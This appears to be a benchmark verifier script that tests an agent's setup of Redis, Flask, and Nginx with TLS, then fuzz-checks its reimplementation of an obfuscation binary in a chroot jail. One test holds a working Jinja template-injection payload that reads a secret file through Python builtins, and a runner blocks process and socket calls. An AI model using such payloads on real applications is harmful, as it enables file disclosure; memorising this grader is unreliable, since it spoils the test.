#!/bin/bash
mkdir -p /logs/verifier

cat << 'TEST_EOF' > /tmp/test_final_state.py
import ast
import os
import random
import ssl
import stat
import string
import subprocess
import urllib.error
import urllib.parse
import urllib.request

import pytest


def listener_pids(port):
    """Return PIDs holding a TCP listen socket on the requested port."""
    inodes = set()
    for table in ("/proc/net/tcp", "/proc/net/tcp6"):
        try:
            with open(table) as f:
                next(f, None)
                for line in f:
                    fields = line.split()
                    if len(fields) >= 10 and fields[3] == "0A":
                        local_port = int(fields[1].rsplit(":", 1)[1], 16)
                        if local_port == port:
                            inodes.add(fields[9])
        except FileNotFoundError:
            pass

    pids = set()
    for entry in os.listdir("/proc"):
        if not entry.isdigit():
            continue
        fd_dir = f"/proc/{entry}/fd"
        try:
            for fd in os.listdir(fd_dir):
                try:
                    target = os.readlink(f"{fd_dir}/{fd}")
                except OSError:
                    continue
                if target.startswith("socket:[") and target[8:-1] in inodes:
                    pids.add(int(entry))
                    break
        except (FileNotFoundError, PermissionError):
            continue
    return pids


def cmdline(pid):
    try:
        with open(f"/proc/{pid}/cmdline", "rb") as f:
            return f.read().replace(b"\0", b" ").decode("utf-8", "replace")
    except OSError:
        return ""


def test_nginx_tls_and_proxy():
    """Validates Phase 1: Redis, Flask, Nginx TLS, proxying, and CSP."""
    assert os.path.exists("/app/cert.pem"), "/app/cert.pem is missing. TLS certificate was not generated."
    assert os.path.exists("/app/key.pem"), "/app/key.pem is missing. TLS key was not generated."

    cert_check = subprocess.run(
        ["openssl", "x509", "-in", "/app/cert.pem", "-noout"],
        stdout=subprocess.PIPE, stderr=subprocess.PIPE
    )
    assert cert_check.returncode == 0, f"/app/cert.pem is not a valid X.509 certificate: {cert_check.stderr.decode()}"
    key_check = subprocess.run(
        ["openssl", "pkey", "-in", "/app/key.pem", "-noout"],
        stdout=subprocess.PIPE, stderr=subprocess.PIPE
    )
    assert key_check.returncode == 0, f"/app/key.pem is not a valid private key: {key_check.stderr.decode()}"

    redis = subprocess.run(
        ["redis-cli", "-h", "127.0.0.1", "-p", "6379", "PING"],
        stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=5
    )
    assert redis.returncode == 0 and redis.stdout.strip() == b"PONG", "Redis is not running on port 6379."
    redis_pids = listener_pids(6379)
    assert redis_pids, "No process is listening on Redis port 6379."
    assert any("redis-server" in cmdline(pid) for pid in redis_pids), "Port 6379 is not being served by redis-server."

    with urllib.request.urlopen("http://127.0.0.1:5000/", timeout=5) as response:
        flask_status = response.getcode()
        flask_body = response.read()
    assert flask_status == 200
    assert flask_body == b"Hello from Flask", "The Flask application is not serving its expected response on port 5000."
    flask_pids = listener_pids(5000)
    assert flask_pids, "No process is listening on Flask port 5000."
    assert any("gunicorn" in cmdline(pid) and "app:app" in cmdline(pid) for pid in flask_pids), \
        "Port 5000 is not being served by the required Gunicorn Flask service."

    nginx_pids = listener_pids(8443)
    assert nginx_pids, "No process is listening on TLS port 8443."
    assert any("nginx" in cmdline(pid) for pid in nginx_pids), "Port 8443 is not being served by Nginx."

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    try:
        req = urllib.request.Request("https://localhost:8443/")
        with urllib.request.urlopen(req, context=ctx, timeout=5) as response:
            status = response.getcode()
            headers = response.info()
            body = response.read()
    except urllib.error.HTTPError as e:
        status = e.code
        headers = e.headers
        body = e.read()
    except Exception as e:
        pytest.fail(f"Failed to connect to Nginx on https://localhost:8443/: {e}")

    assert status == 200, f"Expected HTTP status 200 from Flask via Nginx, got {status}"
    assert body == b"Hello from Flask", "Nginx did not proxy the expected Flask response."

    csp_header = headers.get("Content-Security-Policy")
    assert csp_header is not None, "Content-Security-Policy header is missing from the response."
    assert csp_header.strip() == "default-src 'self';", \
        f"Incorrect CSP header value. Expected \"default-src 'self';\", got: {csp_header}"


def test_ssti_can_read_secret_seed():
    """Validates Phase 2 by exercising the documented SSTI against Flask."""
    with open("/app/secret_seed.txt", "rb") as f:
        expected = f.read()

    payload = "{{ get_flashed_messages.__globals__['__builtins__']['open']('/app/secret_seed.txt').read() }}"
    url = "http://127.0.0.1:5000/render?tmpl=" + urllib.parse.quote(payload, safe="")
    try:
        with urllib.request.urlopen(url, timeout=5) as response:
            assert response.getcode() == 200
            actual = response.read()
    except Exception as e:
        pytest.fail(f"Failed to exploit the Flask SSTI endpoint locally: {e}")
    assert actual == expected, "The SSTI exploit did not disclose /app/secret_seed.txt."


def validate_python_source(path):
    assert os.path.isfile(path) and not os.path.islink(path), f"Agent script must be a regular file: {path}"
    mode = os.stat(path).st_mode
    assert mode & (stat.S_IXUSR | stat.S_IXGRP | stat.S_IXOTH), "Agent script is not executable."
    try:
        with open(path, "r", encoding="utf-8") as f:
            source = f.read()
        tree = ast.parse(source, filename=path)
    except (UnicodeDecodeError, SyntaxError) as e:
        pytest.fail(f"Agent artifact is not a valid Python source file: {e}")

    prohibited = {"subprocess", "ctypes", "socket", "multiprocessing", "_posixsubprocess"}
    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            names = {alias.name.split('.')[0] for alias in node.names}
        elif isinstance(node, ast.ImportFrom):
            names = {(node.module or "").split('.')[0]}
        else:
            continue
        bad = names & prohibited
        assert not bad, f"log_processor.py must be a pure implementation, not a wrapper using {sorted(bad)}."


def expected_transform(hex_input, seed):
    usable = hex_input[:(len(hex_input) // 2) * 2]
    output = bytearray()
    for i in range(0, len(usable), 2):
        value = int(usable[i:i + 2], 16)
        mixed = value ^ seed[(i // 2) % len(seed)]
        output.append(((mixed << 2) & 0xff) | (mixed >> 6))
    return output.hex() + "\n"


def test_log_processor_fuzz_equivalence():
    """Validates Phase 3 independently and with the original oracle comparison."""
    agent_script = "/home/user/log_processor.py"
    oracle_bin = "/app/log_obfuscator_oracle"

    assert os.path.exists(agent_script), f"Agent script missing: {agent_script}"
    assert os.path.exists(oracle_bin), f"Oracle binary missing: {oracle_bin}"
    validate_python_source(agent_script)

    with open("/app/secret_seed.txt", "rb") as f:
        seed = f.read()
    if seed.endswith(b"\n"):
        seed = seed[:-1]
    assert seed, "Secret seed is empty."

    jail = "/tmp/log_processor_jail"
    assert os.path.exists(jail), "Isolated Python test environment was not prepared."

    random.seed(42)
    for i in range(100):
        length = random.randint(10, 100)
        hex_input = "".join(random.choices(string.hexdigits.lower(), k=length))
        expected = expected_transform(hex_input, seed)

        try:
            oracle_proc = subprocess.run(
                [oracle_bin], input=hex_input.encode("utf-8"),
                stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                timeout=2, check=True
            )
            oracle_out = oracle_proc.stdout.decode("utf-8").strip()
        except subprocess.CalledProcessError as e:
            pytest.fail(f"Oracle binary failed unexpectedly on input {hex_input}: {e.stderr.decode('utf-8')}")
        except subprocess.TimeoutExpired:
            pytest.fail(f"Oracle binary timed out on input {hex_input}")

        assert oracle_proc.stdout.decode("utf-8") == expected, \
            f"Oracle disagrees with the independently derived transformation on iteration {i + 1}."

        try:
            agent_proc = subprocess.run(
                ["chroot", "--userspec=65534:65534", jail,
                 "/usr/bin/python3", "/work/runner.py"],
                input=hex_input.encode("utf-8"),
                stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                timeout=2, check=True
            )
            agent_raw = agent_proc.stdout.decode("utf-8")
            agent_out = agent_raw.strip()
        except subprocess.CalledProcessError as e:
            pytest.fail(f"Agent script failed on input {hex_input}.\nStderr: {e.stderr.decode('utf-8', 'replace')}")
        except subprocess.TimeoutExpired:
            pytest.fail(f"Agent script timed out on input {hex_input}")

        assert agent_out == oracle_out, (
            f"Output mismatch on fuzz iteration {i + 1}.\n"
            f"Input (stdin): {hex_input}\n"
            f"Expected Output (Oracle): {oracle_out}\n"
            f"Actual Output (Agent):    {agent_out}"
        )
        assert agent_raw == expected, \
            f"Agent output must be exact and include one trailing newline on iteration {i + 1}."
TEST_EOF

prepare_jail() {
    jail=/tmp/log_processor_jail
    rm -rf "$jail"
    mkdir -p "$jail/usr/bin" "$jail/work" "$jail/app" "$jail/tmp"
    chmod 1777 "$jail/tmp"

    cp -L /usr/bin/python3 "$jail/usr/bin/python3"
    ldd /usr/bin/python3 | awk '{ for (i=1; i<=NF; i++) if ($i ~ /^\//) print $i }' | sort -u | while read -r lib; do
        cp --parents -L "$lib" "$jail"
    done
    if [ -f /etc/ld.so.cache ]; then
        cp --parents /etc/ld.so.cache "$jail"
    fi

    stdlib=$(python3 -c 'import sysconfig; print(sysconfig.get_paths()["stdlib"])')
    mkdir -p "$jail$(dirname "$stdlib")"
    cp -a "$stdlib" "$jail$(dirname "$stdlib")/"

    cp /home/user/log_processor.py "$jail/work/log_processor.py"
    cp /app/secret_seed.txt "$jail/app/secret_seed.txt"
    chmod -R a+rX "$jail/work" "$jail/app"

    cat << 'RUNNER_EOF' > "$jail/work/runner.py"
import runpy
import sys

blocked_exact = {
    "os.system", "os.exec", "os.posix_spawn", "os.spawn", "os.fork",
    "os.forkpty", "subprocess.Popen", "pty.spawn"
}
blocked_prefixes = ("socket.", "ctypes.")

def audit(event, args):
    if event in blocked_exact or event.startswith(blocked_prefixes):
        raise RuntimeError("external execution and IPC are forbidden for the pure-Python implementation")

sys.addaudithook(audit)
runpy.run_path("/work/log_processor.py", run_name="__main__")
RUNNER_EOF
    chmod 755 "$jail/work/runner.py"
}

if prepare_jail && python3 -m pytest /tmp/test_final_state.py -x --tb=short 2>&1; then
    echo "1" > /logs/verifier/reward.txt
else
    echo "0" > /logs/verifier/reward.txt
fi
